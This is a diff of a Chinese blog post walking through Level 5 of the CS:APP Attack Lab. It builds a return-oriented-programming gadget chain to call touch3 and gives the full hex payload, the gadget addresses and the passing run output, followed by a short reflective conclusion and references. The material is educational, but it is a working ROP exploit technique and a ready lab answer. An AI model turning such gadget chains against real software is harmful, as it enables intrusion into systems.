@@ -421,6 +421,83 @@ PASS: Would have posted the following:
 
 #### 0x2.2 Level 5
 
+Level5 和 Level3 类似，不同点在于 Level3 使用自己插入的代码进行攻击，而 Level5 需要使用 gadget 的方式，这让任务变得更难了。
+
+按照 Level3 的要求，需要传入一个字符串的指针，字符串由于有被栈覆盖的风险，所以需要放在栈顶的最大可能位置。在 Level3 里面获取字符串的地址比较容易，因为每次程序启动的地址都是一样的，这意味着每次都可以确定写入的字符串地址，但是在 Level5 中，这个方式并不可行，因为每次程序执行的地址都不一样。
+
+那么有什么办法可以获取到字符串的地址呢？既然绝对地址不可获取，那么我们可以通过相对地址的方式来进行获取，具体来说就是通过 `getbuf` 执行完之后的地址作为基础地址，然后通过计算插入的字符串地址和这个位置的偏移量来得到最终的字符串地址。可以用下面的一个示意图来举例。
+
+```js
+movq %rsp, %rdi
+popq %rsi
+offset
+lea  (%rdi,%rsi,1),%rdi
+0x4018fa touch3 addr
+"" string content
+```
+
+在 offset 上面的指令将栈帧 `%rsp` 放到 `%rdi` 中保存，这样就可以保留基础地址，然后将 offset 的值放到 `%rsi` 中，最后通过 `lea` 进行地址的计算，获得 string 的有效地址。如果可以自己插入指令去运行，非常简单就可以完成这个实验，但是问题是我们无法获取插入指令的地址，就像上面说的，每次地址都会变化，所以需要采用 gadget 的方式，即在已有代码中对片段进行选择。
+
+通过在 *rtarget.s* 中对代码片段进行挑选，通过组合之后可以获得下面的代码，其中 `movq %rsp, %rdi` 因为没有现成的代码片段，所以被拆分成了 `movq %rsp, %rax` 和 `movq %rax, %rdi`。
+
+而 `popq %rsi` 则需要更多的指令进行完成，这里就不具体解释了，直接通过阅读下面的汇编代码就可以了解对应的内容。
+
+```js
+401a06   48 89 e0 c3       mov %rsp, %rax
+4019c5   48 89 c7 90 c3    mov %rax, %rdi
+4019cc   58 90 c3          popq %rax (72 -> %rax)
+0x48(72) offset            
+401a20   89 c2 00 c9 c3    movl %eax, %edx
+401a34   89 d1 38 c9 c3    movl %edx, %ecx
+401a27   89 ce 38 c0 c3    movl %ecx, %esi
+4019d6   48 8d 04 37 c3    (%rdi,%rsi,1),%rax 
+4019c5   48 89 c7 90 c3    movq %rax, %rdi
+4018fa   touch addr
+string content
+```
+
+最后来决定 *offset* 的值，通过计算在字符串内容之前插入的 *gadget* 和其他的内容的行数，可以算出在 10 进制下是 9*8 = 72，在 16 进制下则为 48。
+
+最终写入的 txt 文本为
+
+```js
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+06 1a 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+20 1a 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+27 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61 
+00
+```
+
+```shell
+./hex2raw -i rtarget.3.txt | ./rtarget -q
+
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+```
+
 ### 0x3 Conclusion
 
+通过完成 attack lab，相当于自己去走一遍黑客攻击的流程，之前一直对黑客是如何攻击的并不清楚，而且也比较好奇，这个 lab 虽然简单，却通过两种攻击方式的演示详细地揭示了这个过程，而且通过自己动手做实验，更清楚了其中的流程，算是解答了之前关于黑客攻击的一些疑惑。
+
+另外这个实验虽然是一个攻击实验，但是却给了我们一些启发，了解敌人的攻击方式之后可以更好地为防御他们做准备。同时通过这个实验，再一次巩固了汇编的内容，加深了栈帧的理解，对程序调用，压栈和退站有了更好的理解。
+
 ### 0x4 Reference
+
+- [recitation05-attacklab.pptx (cmu.edu)](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f21/www/recitations/rec05_slides.pdf)
+- [attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
+- [《深入理解计算机系统》Attack Lab实验解析 | Yi's Blog (earthaa.github.io)](https://earthaa.github.io/2020/02/11/CSAPP-Attacklab/)
+- [《深入理解计算机系统》实验3.Attack Lab | 贺巩山的博客 (hegongshan.com)](https://www.hegongshan.com/2021/06/02/csapp-3-attack-lab/)
